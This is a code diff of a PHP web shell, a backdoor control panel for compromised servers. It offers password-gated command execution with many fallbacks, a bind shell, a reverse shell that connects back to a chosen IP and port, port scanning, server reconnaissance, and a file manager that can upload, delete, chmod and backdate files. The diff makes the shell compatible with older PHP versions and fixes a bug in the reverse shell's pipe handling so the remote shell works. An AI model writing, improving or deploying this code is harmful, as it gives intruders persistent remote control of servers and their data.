@@ -10,8 +10,9 @@ set_time_limit(0);
 // Default password hash using MD5 for 'myp@ssw0rd'
 $default_password_hash = '2ebba5cd75576c408240e57110e7b4ff';
 
-$WHITELISTED_IPS = [];
-$WHITELISTED_USER_AGENTS = [];
+// --- COMPATIBILITY: Changed [] to array() for PHP < 5.4 ---
+$WHITELISTED_IPS = array();
+$WHITELISTED_USER_AGENTS = array();
 
 if (!empty($WHITELISTED_IPS) && !in_array($_SERVER['REMOTE_ADDR'], $WHITELISTED_IPS)) {
     http_response_code(403);
@@ -20,7 +21,8 @@ if (!empty($WHITELISTED_IPS) && !in_array($_SERVER['REMOTE_ADDR'], $WHITELISTED_
 }
 
 if (!empty($WHITELISTED_USER_AGENTS)) {
-    $currentUserAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+    // --- COMPATIBILITY: Replaced ?? with isset() ternary for PHP < 7.0 ---
+    $currentUserAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
     $uaMatch = false;
     foreach ($WHITELISTED_USER_AGENTS as $ua) {
         if (strpos($currentUserAgent, $ua) !== false) {
@@ -129,15 +131,18 @@ function is_callable_shell_func($function_name) {
 function execute_command_with_fallback($command) {
     $full_command_redirect = $command . ' 2>&1';
 
-    // Priority 1: proc_open (more control, captures stderr separately)
+    // Priority 1: proc_open (more control)
     if (is_callable_shell_func('proc_open')) {
-        $descriptorspec = [
-           0 => ["pipe", "r"],  // stdin
-           1 => ["pipe", "w"],  // stdout
-           2 => ["pipe", "w"]   // stderr
-        ];
-        $pipes = [];
-        $process = @proc_open($command, $descriptorspec, $pipes, $_SESSION['terminal_cwd'] ?? getcwd());
+        // --- COMPATIBILITY: Changed [] to array() for PHP < 5.4 ---
+        $descriptorspec = array(
+           0 => array("pipe", "r"),  // stdin
+           1 => array("pipe", "w"),  // stdout
+           2 => array("pipe", "w")   // stderr
+        );
+        $pipes = array();
+        // --- COMPATIBILITY: Replaced ?? with isset() ternary for PHP < 7.0 ---
+        $cwd = isset($_SESSION['terminal_cwd']) ? $_SESSION['terminal_cwd'] : getcwd();
+        $process = @proc_open($command, $descriptorspec, $pipes, $cwd);
         if (is_resource($process)) {
             @fclose($pipes[0]);
             $stdout = @stream_get_contents($pipes[1]);
@@ -190,7 +195,7 @@ function execute_command_with_fallback($command) {
 
     // Priority 6: exec
     if (is_callable_shell_func('exec')) {
-        $output_array = [];
+        $output_array = array();
         @exec($full_command_redirect, $output_array, $return_var);
         return implode("\n", $output_array);
     }
@@ -199,62 +204,52 @@ function execute_command_with_fallback($command) {
 }
 
 /**
- * NEW: Executes a shell command and streams the output in real-time.
- * This is used for the terminal to prevent timeouts on long-running commands.
+ * Executes a shell command and streams the output in real-time.
+ * Used for the terminal to prevent timeouts on long-running commands.
  *
  * @param string $command The command to execute.
  */
 function stream_command($command) {
-    // Set headers to disable any server-side buffering
     if (function_exists('apache_setenv')) {
         @apache_setenv('no-gzip', 1);
     }
     @ini_set('zlib.output_compression', 0);
     @ini_set('implicit_flush', 1);
-    @ob_end_clean(); // Clean any existing output buffers
+    @ob_end_clean();
     ob_implicit_flush(1);
     header('Content-Type: text/plain; charset=utf-8');
     header('X-Content-Type-Options: nosniff');
 
     // proc_open is the best choice for real-time I/O
     if (is_callable_shell_func('proc_open')) {
-        $descriptorspec = [
-           0 => ["pipe", "r"],  // stdin
-           1 => ["pipe", "w"],  // stdout
-           2 => ["pipe", "w"]   // stderr
-        ];
-        $pipes = [];
+        // --- COMPATIBILITY: Changed [] to array() for PHP < 5.4 ---
+        $descriptorspec = array(
+           0 => array("pipe", "r"),  // stdin
+           1 => array("pipe", "w"),  // stdout
+           2 => array("pipe", "w")   // stderr
+        );
+        $pipes = array();
         $process = @proc_open($command, $descriptorspec, $pipes, $_SESSION['terminal_cwd']);
 
         if (is_resource($process)) {
-            fclose($pipes[0]); // We don't need to write to stdin
+            fclose($pipes[0]);
             stream_set_blocking($pipes[1], false);
             stream_set_blocking($pipes[2], false);
 
             while (true) {
                 $status = proc_get_status($process);
                 if (!$status['running']) {
-                    break; // Process has exited
+                    break;
                 }
-
-                // Read from stdout
                 $stdout = stream_get_contents($pipes[1]);
-                if ($stdout !== false && $stdout !== '') {
-                    echo $stdout;
-                    flush();
-                }
+                if ($stdout !== false && $stdout !== '') { echo $stdout; flush(); }
 
-                // Read from stderr
                 $stderr = stream_get_contents($pipes[2]);
-                if ($stderr !== false && $stderr !== '') {
-                    echo $stderr;
-                    flush();
-                }
+                if ($stderr !== false && $stderr !== '') { echo $stderr; flush(); }
 
-                usleep(50000); // 50ms delay to prevent high CPU usage in the loop
+                usleep(50000);
             }
 
-            // Ensure we capture any final output
             $stdout = stream_get_contents($pipes[1]);
             if ($stdout) { echo $stdout; flush(); }
             $stderr = stream_get_contents($pipes[2]);
@@ -267,7 +262,7 @@ function stream_command($command) {
         }
     }
 
-    // Fallback to popen which can also stream, though with less control
+    // Fallback to popen
     if (is_callable_shell_func('popen')) {
         $handle = @popen($command . ' 2>&1', 'r');
         if ($handle) {
@@ -281,7 +276,7 @@ function stream_command($command) {
         }
     }
 
-    // If no streaming functions are available, fall back to the old blocking method
+    // If no streaming available, use blocking method
     echo execute_command_with_fallback($command);
     flush();
 }
@@ -345,18 +340,22 @@ function network_start_port_bind($port, $password) {
             $shell_cmd = $is_windows ? 'cmd.exe' : '/bin/sh -i';
 
              if(function_exists('proc_open')) {
+                // --- COMPATIBILITY: Changed [] to array() for PHP < 5.4 ---
                 $descriptorspec = array(
                     0 => array("pipe", "r"),
                     1 => array("pipe", "w"),
                     2 => array("pipe", "w")
                 );
-                $process = @proc_open($shell_cmd, $descriptorspec, $pipes, $_SESSION['terminal_cwd'] ?? getcwd());
+                // --- COMPATIBILITY: Replaced ?? with isset() ternary for PHP < 7.0 ---
+                $cwd = isset($_SESSION['terminal_cwd']) ? $_SESSION['terminal_cwd'] : getcwd();
+                $process = @proc_open($shell_cmd, $descriptorspec, $pipes, $cwd);
 
                 if (is_resource($process)) {
                     stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0);
                     stream_set_blocking($pipes[2], 0); stream_set_blocking($client, 0);
 
-                    $initial_prompt = ($is_windows ? '' : "Shell process started.\n") . ($is_windows ? (($_SESSION['terminal_cwd'] ?? getcwd())."> ") : (($_SESSION['terminal_cwd'] ?? getcwd())."$ "));
+                    $prompt_cwd = isset($_SESSION['terminal_cwd']) ? $_SESSION['terminal_cwd'] : getcwd();
+                    $initial_prompt = ($is_windows ? '' : "Shell process started.\n") . ($is_windows ? ($prompt_cwd."> ") : ($prompt_cwd."$ "));
                     @fwrite($client, $initial_prompt);
                     if($is_windows) { @fwrite($pipes[0], "\r\n"); }
 
@@ -421,25 +420,30 @@ function network_start_back_connect($ip, $port) {
         return $output_buffer;
     }
 
+    $server_name = isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : '[server]';
     $output_buffer .= "🔌 Connected back successfully to {$ip}:{$port}!\n";
-    @fwrite($sock, "Shell connected from " . ($_SERVER['SERVER_NAME'] ?? '[server]') . ". PHP Interactive Shell.\n");
+    @fwrite($sock, "Shell connected from " . $server_name . ". PHP Interactive Shell.\n");
 
     $is_windows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
     $shell_cmd = $is_windows ? 'cmd.exe' : '/bin/sh -i';
 
     if (function_exists('proc_open')) {
+        // --- COMPATIBILITY: Changed [] to array() for PHP < 5.4 ---
         $descriptorspec = array(
             0 => array("pipe", "r"),
             1 => array("pipe", "w"),
             2 => array("pipe", "w")
         );
-        $process = @proc_open($shell_cmd, $descriptorspec, $pipes, $_SESSION['terminal_cwd'] ?? getcwd());
+        // --- COMPATIBILITY: Replaced ?? with isset() ternary for PHP < 7.0 ---
+        $cwd = isset($_SESSION['terminal_cwd']) ? $_SESSION['terminal_cwd'] : getcwd();
+        $process = @proc_open($shell_cmd, $descriptorspec, $pipes, $cwd);
 
         if (is_resource($process)) {
             stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0);
             stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0);
 
-            $initial_prompt = ($is_windows ? '' : "Shell process started.\n") . ($is_windows ? (($_SESSION['terminal_cwd'] ?? getcwd())."> ") : (($_SESSION['terminal_cwd'] ?? getcwd())."$ "));
+            $prompt_cwd = isset($_SESSION['terminal_cwd']) ? $_SESSION['terminal_cwd'] : getcwd();
+            $initial_prompt = ($is_windows ? '' : "Shell process started.\n") . ($is_windows ? ($prompt_cwd."> ") : ($prompt_cwd."$ "));
              @fwrite($sock, $initial_prompt);
              if($is_windows) { @fwrite($pipes[0], "\r\n"); }
 
@@ -459,11 +463,12 @@ function network_start_back_connect($ip, $port) {
                             $input = @fread($sock, 4096);
                             if ($input === false || $input === '') { proc_terminate($process); break 2; }
                             @fwrite($pipes[0], $input);
+                        // --- BUG FIX: Was reading from $sock, should be $pipes[1] ---
                         } elseif ($socket_s == $pipes[1]) {
-                            $output_shell = @fread($sock, 4096);
+                            $output_shell = @fread($pipes[1], 4096);
                             if ($output_shell !== false && $output_shell !== '') @fwrite($sock, $output_shell);
                         } elseif ($socket_s == $pipes[2]) {
-                            $output_shell = @fread($sock, 4096);
+                            $output_shell = @fread($pipes[2], 4096);
                             if ($output_shell !== false && $output_shell !== '') @fwrite($sock, "STDERR: " . $output_shell);
                         }
                     }
@@ -495,14 +500,15 @@ function do_ping($host) {
             $output = @shell_exec("ping -c 4 {$host_safe} 2>&1");
         }
     }
-    return $output ?: "Ping failed or no output.";
+    return $output ? $output : "Ping failed or no output.";
 }
 
 function do_port_scan($host, $ports) {
     $host = trim($host);
     if (empty($host)) return "No host provided.";
     
-    $ports_to_scan = [];
+    // --- COMPATIBILITY: Changed [] to array() for PHP < 5.4 ---
+    $ports_to_scan = array();
     $port_ranges = explode(',', $ports);
     foreach ($port_ranges as $range) {
         if (strpos($range, '-') !== false) {
@@ -563,13 +569,15 @@ function do_dns_lookup($host) {
 }
 
 function getServerInfoDetails() {
-    $info = [];
-    $info['Server Software'] = $_SERVER['SERVER_SOFTWARE'] ?? @getenv('SERVER_SOFTWARE') ?? 'N/A';
-    $info['Server Name'] = $_SERVER['SERVER_NAME'] ?? 'N/A';
-    $info['Server Admin'] = $_SERVER['SERVER_ADMIN'] ?? 'N/A';
-    $info['Server Port'] = $_SERVER['SERVER_PORT'] ?? 'N/A';
-    $info['Document Root'] = $_SERVER['DOCUMENT_ROOT'] ?? 'N/A';
-    $info['Script Filename'] = $_SERVER['SCRIPT_FILENAME'] ?? 'N/A';
+    // --- COMPATIBILITY: Changed [] to array() for PHP < 5.4 ---
+    $info = array();
+    // --- COMPATIBILITY: Replaced all ?? with isset() ternary for PHP < 7.0 ---
+    $info['Server Software'] = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : (isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'N/A');
+    $info['Server Name'] = isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : 'N/A';
+    $info['Server Admin'] = isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : 'N/A';
+    $info['Server Port'] = isset($_SERVER['SERVER_PORT']) ? $_SERVER['SERVER_PORT'] : 'N/A';
+    $info['Document Root'] = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : 'N/A';
+    $info['Script Filename'] = isset($_SERVER['SCRIPT_FILENAME']) ? $_SERVER['SCRIPT_FILENAME'] : 'N/A';
     $info['PHP Version'] = PHP_VERSION;
     $info['Operating System'] = php_uname();
     $nproc = 'N/A';
@@ -580,7 +588,7 @@ function getServerInfoDetails() {
         } elseif (@is_readable('/proc/cpuinfo')) {
             $cpuinfo = @file_get_contents('/proc/cpuinfo');
             if ($cpuinfo) {
-                $matches = [];
+                $matches = array();
                 preg_match_all('/^processor\s*:\s*\d+/m', $cpuinfo, $matches);
                 $nproc_count = count($matches[0]);
                 if ($nproc_count > 0) $nproc = $nproc_count;
@@ -605,8 +613,8 @@ function getServerInfoDetails() {
     $info['Safe Mode'] = $safe_mode_val ? '<span style="color:red;">ON</span>' : '<span style="color:lime;">OFF</span>';
 
     $disabled_functions = ini_get('disable_functions');
-    $info['Disabled Functions'] = $disabled_functions ?: 'None';
-    $info['Open Basedir'] = ini_get('open_basedir') ?: 'None';
+    $info['Disabled Functions'] = $disabled_functions ? $disabled_functions : 'None';
+    $info['Open Basedir'] = ini_get('open_basedir') ? ini_get('open_basedir') : 'None';
     $info['Memory Limit'] = ini_get('memory_limit');
     $info['Max Execution Time'] = ini_get('max_execution_time') . ' seconds';
 
@@ -616,20 +624,22 @@ function getServerInfoDetails() {
 
     if (function_exists('curl_version')) {
         $curl_ver = curl_version();
-        $info['cURL Support'] = '<span style="color:lime;">Enabled</span> - Version: ' . ($curl_ver['version'] ?? 'N/A');
+        $curl_ver_num = isset($curl_ver['version']) ? $curl_ver['version'] : 'N/A';
+        $info['cURL Support'] = '<span style="color:lime;">Enabled</span> - Version: ' . $curl_ver_num;
     } else {
         $info['cURL Support'] = '<span style="color:orange;">Disabled</span>';
     }
     $info['Mailer (mail function)'] = function_exists('mail') ? '<span style="color:lime;">Enabled</span>' : '<span style="color:orange;">Disabled</span>';
 
     $info['System Temp Directory'] = sys_get_temp_dir();
-    $info['Server IP'] = $_SERVER['SERVER_ADDR'] ?? @gethostbyname($_SERVER['SERVER_NAME'] ?? 'localhost') ?? 'N/A';
-    $info['Client IP'] = $_SERVER['REMOTE_ADDR'] ?? 'N/A';
+    $server_addr = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : @gethostbyname(isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : 'localhost');
+    $info['Server IP'] = $server_addr ? $server_addr : 'N/A';
+    $info['Client IP'] = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'N/A';
     $info['Server Timezone'] = date_default_timezone_get();
     $info['Server Time (UTC)'] = gmdate("Y-m-d H:i:s");
     $info['Server Time (Local)'] = date("Y-m-d H:i:s");
 
-    $db_ext = [];
+    $db_ext = array();
     if (extension_loaded('mysqli')) $db_ext[] = 'MySQLi';
     if (extension_loaded('pdo_mysql')) $db_ext[] = 'PDO_MySQL';
     if (extension_loaded('pgsql')) $db_ext[] = 'PostgreSQL';
@@ -638,7 +648,7 @@ function getServerInfoDetails() {
     if (extension_loaded('pdo_sqlite')) $db_ext[] = 'PDO_SQLite';
     $info['Database Extensions'] = !empty($db_ext) ? implode(', ', $db_ext) : 'None commonly detected';
 
-    $current_path_for_disk_space = getcwd() ?: __DIR__;
+    $current_path_for_disk_space = getcwd() ? getcwd() : __DIR__;
     $disk_free = @disk_free_space($current_path_for_disk_space);
     $disk_total = @disk_total_space($current_path_for_disk_space);
     if ($disk_free !== false && $disk_total !== false && $disk_total > 0) {
@@ -671,7 +681,7 @@ function getServerInfoDetails() {
     } else {
         if(command_exists('ipconfig')) { $network_interface_output = @shell_exec('ipconfig /all'); }
     }
-    $info['Network Interfaces (attempt)'] = trim($network_interface_output ?: 'Command failed, no output, or not found.');
+    $info['Network Interfaces (attempt)'] = trim($network_interface_output ? $network_interface_output : 'Command failed, no output, or not found.');
 
     return $info;
 }
@@ -686,10 +696,8 @@ function formatSizeUnits($bytes) {
 }
 
 if ($authenticated && isset($_POST['ajax_action'])) {
-    // Session CWD should be honored for all ajax actions
     if (isset($_SESSION['terminal_cwd']) && is_dir($_SESSION['terminal_cwd'])) {
         if(!@chdir($_SESSION['terminal_cwd'])) {
-            // Fallback if chdir fails
             $_SESSION['terminal_cwd'] = getcwd();
             @chdir($_SESSION['terminal_cwd']);
         }
@@ -704,13 +712,11 @@ if ($authenticated && isset($_POST['ajax_action'])) {
             if (isset($_POST['command'])) {
                 $command = $_POST['command'];
                 
-                // Route 'cd' commands to return JSON for CWD updates
                 if (preg_match('/^cd\s*(.*)/i', $command, $matches)) {
                     header('Content-Type: application/json');
                     $output = "";
                     $new_dir_input = trim($matches[1]);
                     
-                    // Handle plain 'cd' or 'cd ~' to go home
                     if (empty($new_dir_input) || $new_dir_input === '~' || $new_dir_input === '$HOME' || ($new_dir_input === '%USERPROFILE%' && DIRECTORY_SEPARATOR === '\\')) {
                         $home_dir = getenv('HOME');
                         if (!$home_dir && DIRECTORY_SEPARATOR === '\\') $home_dir = getenv('USERPROFILE');
@@ -720,9 +726,9 @@ if ($authenticated && isset($_POST['ajax_action'])) {
                             $output = "[Error] Could not determine home directory path.";
                             $new_dir_abs = false;
                         }
-                    } else { // Handle 'cd' with a path argument
+                    } else {
                         $new_dir = $new_dir_input;
-                        if (DIRECTORY_SEPARATOR === '\\') { // Windows-specific path handling
+                        if (DIRECTORY_SEPARATOR === '\\') {
                             if (preg_match('/^[a-zA-Z]:$/', $new_dir)) {
                                  $new_dir_abs = realpath($new_dir . '\\');
                             } elseif (substr($new_dir, 1, 1) === ':') {
@@ -730,7 +736,7 @@ if ($authenticated && isset($_POST['ajax_action'])) {
                             } else {
                                 $new_dir_abs = realpath($current_ajax_cwd . DIRECTORY_SEPARATOR . $new_dir);
                             }
-                        } else { // Unix-like path handling
+                        } else {
                              if (substr($new_dir, 0, 1) !== '/') {
                                 $new_dir_abs = realpath($current_ajax_cwd . '/' . $new_dir);
                              } else {
@@ -752,23 +758,24 @@ if ($authenticated && isset($_POST['ajax_action'])) {
                     } else {
                          if(empty($output)) $output = "[Error] Path does not exist: " . htmlspecialchars($new_dir_input);
                     }
-                    echo json_encode(['status' => 'success', 'output' => $output, 'cwd' => $_SESSION['terminal_cwd']]);
+                    echo json_encode(array('status' => 'success', 'output' => $output, 'cwd' => $_SESSION['terminal_cwd']));
 
                 } else {
-                    // For all other commands, use the new streaming function
                     stream_command($command);
                 }
             } else {
                 header('Content-Type: application/json');
-                echo json_encode(['status' => 'error', 'message' => 'No command provided.', 'cwd' => $current_ajax_cwd]);
+                echo json_encode(array('status' => 'error', 'message' => 'No command provided.', 'cwd' => $current_ajax_cwd));
             }
-            exit; // IMPORTANT: Stop script execution after handling the action
+            exit;
             break;
 
         case 'get_file_listing':
             header('Content-Type: application/json');
-            $response = ['status' => 'error', 'message' => 'Invalid AJAX action.'];
-            $fm_path = $_POST['path'] ?? $current_ajax_cwd;
+            // --- COMPATIBILITY: Changed [] to array() for PHP < 5.4 ---
+            $response = array('status' => 'error', 'message' => 'Invalid AJAX action.');
+            // --- COMPATIBILITY: Replaced ?? with isset() ternary for PHP < 7.0 ---
+            $fm_path = isset($_POST['path']) ? $_POST['path'] : $current_ajax_cwd;
             $term_cwd_backup = getcwd();
 
             if(!@chdir($fm_path)) {
@@ -790,7 +797,7 @@ if ($authenticated && isset($_POST['ajax_action'])) {
                 exit;
             }
 
-            $dirs = []; $files_list = [];
+            $dirs = array(); $files_list = array();
 
             $parentPath = realpath($realPath . DIRECTORY_SEPARATOR . '..');
             if ($parentPath !== false && $parentPath !== $realPath && @is_dir($parentPath)) {
@@ -798,7 +805,8 @@ if ($authenticated && isset($_POST['ajax_action'])) {
                 if (!@is_readable($parentPath)) $permColorParent = '#ff0000';
                 elseif (@is_writable($parentPath)) $permColorParent = '#00cc00';
 
-                $dirs[] = [
+                // --- COMPATIBILITY: Changed [] to array() for PHP < 5.4 ---
+                $dirs[] = array(
                     'name' => '..', 'type' => 'dir', 'size' => '-',
                     'owner' => 'N/A',
                     'perms' => substr(sprintf('%o', @fileperms($parentPath)), -4),
@@ -806,7 +814,7 @@ if ($authenticated && isset($_POST['ajax_action'])) {
                     'icon_class' => 'fa-solid fa-arrow-turn-up fa-rotate-270', 'icon_color' => '#FFBF00',
                     'modified' => date("Y-m-d H:i:s", @filemtime($parentPath)),
                     'full_path' => $parentPath
-                ];
+                );
             }
 
             foreach ($items as $item) {
@@ -823,8 +831,9 @@ if ($authenticated && isset($_POST['ajax_action'])) {
                     if ($owner_id !== false && $group_id !== false) {
                         $owner_data = @posix_getpwuid($owner_id);
                         $group_data = @posix_getgrgid($group_id);
-                        $owner_name = $owner_data['name'] ?? $owner_id;
-                        $group_name = $group_data['name'] ?? $group_id;
+                        // --- COMPATIBILITY: Replaced ?? with isset() ternary for PHP < 7.0 ---
+                        $owner_name = isset($owner_data['name']) ? $owner_data['name'] : $owner_id;
+                        $group_name = isset($group_data['name']) ? $group_data['name'] : $group_id;
                         $owner_info = $owner_name . '/' . $group_name;
                     }
                 }
@@ -884,7 +893,8 @@ if ($authenticated && isset($_POST['ajax_action'])) {
                 }
 
                 $size = $isDir ? '-' : formatSizeUnits(@filesize($itemPath));
-                $entry = [
+                // --- COMPATIBILITY: Changed [] to array() for PHP < 5.4 ---
+                $entry = array(
                     'name' => $item,
                     'type' => $isDir ? 'dir' : 'file',
                     'size' => $size,
@@ -895,7 +905,7 @@ if ($authenticated && isset($_POST['ajax_action'])) {
                     'icon_color' => $icon_color,
                     'modified' => date("Y-m-d H:i:s", @filemtime($itemPath)),
                     'full_path' => $itemPath
-                ];
+                );
 
                 if ($isDir) $dirs[] = $entry; else $files_list[] = $entry;
             }
@@ -907,28 +917,20 @@ if ($authenticated && isset($_POST['ajax_action'])) {
             });
             usort($files_list, function($a, $b) { return strcasecmp($a['name'], $b['name']); });
 
-            $response = ['status' => 'success', 'files' => array_merge($dirs, $files_list), 'path' => htmlspecialchars($realPath)];
+            $response = array('status' => 'success', 'files' => array_merge($dirs, $files_list), 'path' => htmlspecialchars($realPath));
             @chdir($term_cwd_backup);
             echo json_encode($response);
             exit;
             break;
     }
 
-    // Default JSON header for all other AJAX actions
     header('Content-Type: application/json');
-    $response = ['status' => 'error', 'message' => 'Invalid AJAX action.'];
+    $response = array('status' => 'error', 'message' => 'Invalid AJAX action.');
 
     switch ($_POST['ajax_action']) {
-        // NOTE: 'execute_command' and 'get_file_listing' have been handled above and exit.
-        // The remaining cases are for other functionalities.
-
         case 'get_file_content':
             if (isset($_POST['path'])) {
-                // FIX: Clear file status cache. This can resolve issues in environments
-                // where file metadata might not be immediately consistent (e.g., WSL, network mounts),
-                // which could be a cause of failure on newer PHP versions.
                 clearstatcache();
-                
                 $filePath = realpath($_POST['path']);
 
                 if ($filePath && is_file($filePath) && is_readable($filePath)) {
@@ -937,19 +939,14 @@ if ($authenticated && isset($_POST['ajax_action'])) {
                         $response['message'] = '[Error] Could not read file content. Check file permissions and server logs.';
                     } else {
                         $final_content = $content;
-                        // FIX: Ensure mbstring extension is available before using it to prevent fatal errors.
                         if (function_exists('mb_convert_encoding')) {
-                            // This step ensures the content is valid UTF-8 for JSON encoding,
-                            // which prevents errors on the client side. It cleans up invalid byte sequences.
                             $final_content = mb_convert_encoding($content, 'UTF-8', 'UTF-8');
                         }
                         
-                        // FIX: Final check to prevent json_encode failure which can happen with binary files
-                        // or very malformed strings even after the conversion attempt.
-                        if (json_encode(['test' => $final_content]) === false) {
+                        if (json_encode(array('test' => $final_content)) === false) {
                             $response['message'] = '[Error] File content could not be encoded for display. It may be a binary file or have an unsupported encoding.';
                         } else {
-                            $response = ['status' => 'success', 'content' => $final_content];
+                            $response = array('status' => 'success', 'content' => $final_content);
                         }
                     }
                 } else {
@@ -976,7 +973,7 @@ if ($authenticated && isset($_POST['ajax_action'])) {
                     $response['message'] = '[Error] Path or file not writable: ' . htmlspecialchars($filePath);
                 } else {
                     if (@file_put_contents($filePath, $_POST['content']) !== false) {
-                        $response = ['status' => 'success', 'message' => 'File saved: ' . htmlspecialchars(basename($filePath))];
+                        $response = array('status' => 'success', 'message' => 'File saved: ' . htmlspecialchars(basename($filePath)));
                     } else {
                         $response['message'] = '[Error] Failed to write file: ' . htmlspecialchars(basename($filePath));
                     }
@@ -992,14 +989,12 @@ if ($authenticated && isset($_POST['ajax_action'])) {
                 if ($itemPath) {
                     if (is_file($itemPath)) {
                         $response = @unlink($itemPath) ?
-                                    ['status' => 'success', 'message' => 'File deleted: '.htmlspecialchars(basename($itemPath))] :
-                                    ['message' => '[Error] Failed to delete file. Check permissions.'];
+                                    array('status' => 'success', 'message' => 'File deleted: '.htmlspecialchars(basename($itemPath))) :
+                                    array('message' => '[Error] Failed to delete file. Check permissions.');
                     } elseif (is_dir($itemPath)) {
-                        // FIX: Replaced the old non-functional recursive delete with a new robust one.
-                        // This function uses scandir to find all files (including hidden ones) and deletes them recursively.
                         function deleteDirectoryRecursive($dir) {
                             if (!file_exists($dir) || !is_dir($dir)) return false;
-                            $items = array_diff(scandir($dir), ['.', '..']);
+                            $items = array_diff(scandir($dir), array('.', '..'));
                             foreach ($items as $item) {
                                 $path = $dir . DIRECTORY_SEPARATOR . $item;
                                 if (is_dir($path)) {
@@ -1011,8 +1006,8 @@ if ($authenticated && isset($_POST['ajax_action'])) {
                             return @rmdir($dir);
                         }
                         $response = deleteDirectoryRecursive($itemPath) ?
-                                    ['status' => 'success', 'message' => 'Directory deleted: '.htmlspecialchars(basename($itemPath))] :
-                                    ['message' => '[Error] Failed to delete directory. Check permissions.'];
+                                    array('status' => 'success', 'message' => 'Directory deleted: '.htmlspecialchars(basename($itemPath))) :
+                                    array('message' => '[Error] Failed to delete directory. Check permissions.');
                     } else {
                         $response['message'] = '[Error] Item is not a file or directory.';
                     }
@@ -1025,7 +1020,8 @@ if ($authenticated && isset($_POST['ajax_action'])) {
             break;
 
         case 'upload_file':
-            $uploadDir = $_POST['upload_target_path'] ?? $current_ajax_cwd;
+            // --- COMPATIBILITY: Replaced ?? with isset() ternary for PHP < 7.0 ---
+            $uploadDir = isset($_POST['upload_target_path']) ? $_POST['upload_target_path'] : $current_ajax_cwd;
             $realUploadDir = realpath($uploadDir);
 
             if (!$realUploadDir || !is_dir($realUploadDir) || !is_writable($realUploadDir)) {
@@ -1034,7 +1030,7 @@ if ($authenticated && isset($_POST['ajax_action'])) {
             }
 
             if (!empty($_FILES['files_to_upload'])) {
-                $uploadedFiles = []; $errors = [];
+                $uploadedFiles = array(); $errors = array();
                 $files = $_FILES['files_to_upload'];
 
                 if (is_array($files['name'])) {
@@ -1062,7 +1058,6 @@ if ($authenticated && isset($_POST['ajax_action'])) {
                 } elseif ($files['error'] !== UPLOAD_ERR_NO_FILE) {
                      $errors[] = "Error uploading " . htmlspecialchars(basename($files['name'])) . ". Code: " . $files['error'];
                 }
-
 
                 if (!empty($uploadedFiles)) {
                     $response['status'] = 'success';
@@ -1092,12 +1087,12 @@ if ($authenticated && isset($_POST['ajax_action'])) {
             } else {
                 if ($is_folder) {
                     $response = @mkdir($basePath . DIRECTORY_SEPARATOR . $name, 0755) ?
-                                ['status' => 'success', 'message' => 'Folder created: ' . htmlspecialchars($name)] :
-                                ['message' => '[Error] Could not create folder. Check permissions.'];
+                                array('status' => 'success', 'message' => 'Folder created: ' . htmlspecialchars($name)) :
+                                array('message' => '[Error] Could not create folder. Check permissions.');
                 } else {
                     $response = @touch($basePath . DIRECTORY_SEPARATOR . $name) ?
-                                ['status' => 'success', 'message' => 'File created: ' . htmlspecialchars($name)] :
-                                ['message' => '[Error] Could not create file. Check permissions.'];
+                                array('status' => 'success', 'message' => 'File created: ' . htmlspecialchars($name)) :
+                                array('message' => '[Error] Could not create file. Check permissions.');
                 }
             }
             break;
@@ -1117,8 +1112,8 @@ if ($authenticated && isset($_POST['ajax_action'])) {
                         $response['message'] = '[Error] Target name already exists: ' . htmlspecialchars($newName);
                     } else {
                         $response = @rename($oldPath, $newPath) ?
-                                    ['status' => 'success', 'message' => 'Item renamed to ' . htmlspecialchars($newName)] :
-                                    ['message' => '[Error] Failed to rename. Check permissions.'];
+                                    array('status' => 'success', 'message' => 'Item renamed to ' . htmlspecialchars($newName)) :
+                                    array('message' => '[Error] Failed to rename. Check permissions.');
                     }
                 }
             } else {
@@ -1138,8 +1133,8 @@ if ($authenticated && isset($_POST['ajax_action'])) {
                 } else {
                     $permsOct = intval($permsStr, 8);
                     $response = @chmod($path, $permsOct) ?
-                                ['status' => 'success', 'message' => 'Permissions changed for ' . htmlspecialchars(basename($path)) . ' to ' . sprintf('%04o', $permsOct)] :
-                                ['message' => '[Error] Failed to change permissions. Check ownership/permissions.'];
+                                array('status' => 'success', 'message' => 'Permissions changed for ' . htmlspecialchars(basename($path)) . ' to ' . sprintf('%04o', $permsOct)) :
+                                array('message' => '[Error] Failed to change permissions. Check ownership/permissions.');
                 }
             } else {
                 $response['message'] = '[Error] Missing path or permissions.';
@@ -1157,7 +1152,7 @@ if ($authenticated && isset($_POST['ajax_action'])) {
                     $response['message'] = '[Error] Invalid date/time format provided: ' . htmlspecialchars($_POST['datetime_str']) . '. Use YYYY-MM-DD HH:MM:SS.';
                 } else {
                     if (@touch($path, $timestamp)) {
-                        $response = ['status' => 'success', 'message' => 'Timestamp updated for ' . htmlspecialchars(basename($path)) . ' to ' . date("Y-m-d H:i:s", $timestamp)];
+                        $response = array('status' => 'success', 'message' => 'Timestamp updated for ' . htmlspecialchars(basename($path)) . ' to ' . date("Y-m-d H:i:s", $timestamp));
                     } else {
                         $response['message'] = '[Error] Failed to update timestamp for ' . htmlspecialchars(basename($path));
                     }
@@ -1168,11 +1163,15 @@ if ($authenticated && isset($_POST['ajax_action'])) {
             break;
 
         case 'network_tool':
-            $sub_action = $_POST['sub_action'] ?? 'none';
+            // --- COMPATIBILITY: Replaced all ?? with isset() ternary for PHP < 7.0 ---
+            $sub_action = isset($_POST['sub_action']) ? $_POST['sub_action'] : 'none';
             $output = '[Error] Invalid network action or parameters.';
-            $host_param = trim($_POST['host'] ?? $_POST['ip'] ?? '');
